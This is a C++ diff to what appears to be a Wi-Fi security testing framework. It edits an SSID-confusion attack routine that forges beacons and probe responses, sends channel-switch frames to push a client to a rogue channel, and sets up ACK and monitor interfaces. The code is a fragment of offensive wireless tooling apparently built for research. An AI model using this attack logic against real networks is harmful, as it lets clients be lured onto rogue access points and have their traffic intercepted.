@@ -41,8 +41,7 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
     }
     probe_resp = std::make_unique<Dot11ProbeResponse>(beacon_to_probe_resp(*confused_beacon, netconfig.rogue_channel));
 
-	//FIXME HARDCODED fake rogue_ap to disconnect -> no SA Query
-    csa_frames = CSA_attack::get_CSA_frames(ap.get(SK::mac), netconfig.real_channel, { 6, WifiBand::BAND_2_4, nullopt }, beacon, sta.get(SK::mac), true);
+	csa_frames = CSA_attack::get_CSA_frames(ap.get(SK::mac), netconfig.real_channel, netconfig.rogue_channel, beacon, sta.get(SK::mac), true);
     Dot11Beacon legacy_beacon = expected_vht_beacon_attack::build_legacy_beacon(*beacon);
 
     // BPF: AP + client traffic only
@@ -51,19 +50,18 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
 	rogue_ap.get(SK::permanent_mac) + ")";
 
 
-	// rogue channel ACKs: active monitor avoids AP VIF responding to client's SAE auth frames
 	const bool prefer_active = att_cfg.at("prefer_active");
+	// rogue channel ACKs: active monitor avoids AP VIF responding to client's SAE auth frames
 	setup_ack_iface(rs, rogue_ap, HWAddress<6>(rogue_ap.get(SK::mac)),
 		netconfig.rogue_channel, prefer_active, rogue_ap->get_ap_iface(), *confused_beacon);
+	//real channel ACKs: rogue_sta uses its own MAC (no spoofing), AP registers real AP as station
+	setup_ack_iface(rs, rogue_sta, HWAddress<6>(rogue_sta.get(SK::mac)),
+		netconfig.real_channel, prefer_active, rogue_sta->get_ap_iface(), *beacon);
 
 	sock_real = make_unique<MonitorSocket>(rogue_sta.get(SK::iface), rogue_sta[SK::netns]);
 	sock_rogue = make_unique<MonitorSocket>(rogue_ap.get(SK::iface), rogue_ap[SK::netns]);
 	sock_real->set_filter(bpf);
 	sock_rogue->set_filter(bpf);
-
-	const string nic_client_ack = "client_ack_vif";
-	rogue_sta->set_mac_address(sta->get(SK::mac));
-	start_ap_hostapd(rs, nic_client_ack, rogue_sta, netconfig.real_channel, sta.get(SK::permanent_mac));
 
     rs.start_observers(ObserverRunPolicy::SKIP);
     rs.process_manager.write_log_all(ATTACK_START_tag);
@@ -116,7 +114,7 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
     }
     rs.process_manager.write_log_all(ATTACK_STOP_tag);
 	stop_ap(rogue_ap->get_ap_iface(), rogue_ap[SK::netns]);
-	hw_capabilities::run_cmd({ "iw", "dev", nic_client_ack, "del" },  rogue_sta[SK::netns], true);
+	stop_ap(rogue_sta->get_ap_iface(), rogue_sta[SK::netns]);
 
 }
 
